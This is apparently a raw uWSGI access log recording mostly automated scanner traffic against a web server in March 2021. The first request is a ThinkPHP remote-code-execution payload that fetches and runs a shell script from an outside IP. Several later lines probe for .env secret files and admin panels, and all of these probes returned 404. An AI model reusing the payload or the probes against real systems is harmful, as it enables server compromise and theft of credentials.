[1615219201] ./uwsgi.log reopened.
[pid: 233989|app: 0|req: 1020/4752] 123.49.38.142 () {36 vars in 832 bytes} [Tue Mar  9 02:45:29 2021] GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://194.40.243.98/ldr.sh|sh => generated 179 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2154/4753] 190.94.144.195 () {30 vars in 439 bytes} [Tue Mar  9 03:15:07 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2155/4754] 192.241.226.16 () {34 vars in 424 bytes} [Tue Mar  9 08:22:57 2021] GET /portal/redlion => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 798/4755] 102.177.105.70 () {32 vars in 466 bytes} [Tue Mar  9 08:57:05 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 799/4756] 193.118.53.210 () {34 vars in 490 bytes} [Tue Mar  9 11:55:29 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 800/4757] 205.185.122.102 () {40 vars in 675 bytes} [Tue Mar  9 12:19:45 2021] GET /config/getuser?index=0 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 801/4758] 51.254.59.113 () {32 vars in 451 bytes} [Tue Mar  9 12:44:46 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 802/4759] 203.159.80.135 () {40 vars in 570 bytes} [Tue Mar  9 14:38:20 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 803/4760] 218.13.14.204 () {42 vars in 814 bytes} [Tue Mar  9 14:43:43 2021] GET /video/play/102991/2-28.html => generated 23427 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2156/4761] 83.166.138.28 () {36 vars in 525 bytes} [Tue Mar  9 15:29:32 2021] GET /.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1021/4762] 83.166.138.28 () {40 vars in 632 bytes} [Tue Mar  9 15:29:36 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 804/4763] 83.166.138.28 () {36 vars in 535 bytes} [Tue Mar  9 15:29:38 2021] GET /core/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 783/4764] 83.166.138.28 () {40 vars in 632 bytes} [Tue Mar  9 15:29:38 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2157/4765] 83.166.138.28 () {36 vars in 533 bytes} [Tue Mar  9 15:29:40 2021] GET /app/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1022/4766] 83.166.138.28 () {40 vars in 632 bytes} [Tue Mar  9 15:29:40 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 784/4767] 83.166.138.28 () {36 vars in 539 bytes} [Tue Mar  9 15:29:42 2021] GET /public/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 785/4768] 83.166.138.28 () {40 vars in 632 bytes} [Tue Mar  9 15:29:44 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 786/4769] 92.118.160.29 () {30 vars in 453 bytes} [Tue Mar  9 15:38:52 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 787/4770] 124.70.90.123 () {34 vars in 453 bytes} [Tue Mar  9 15:50:22 2021] GET /manager/html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
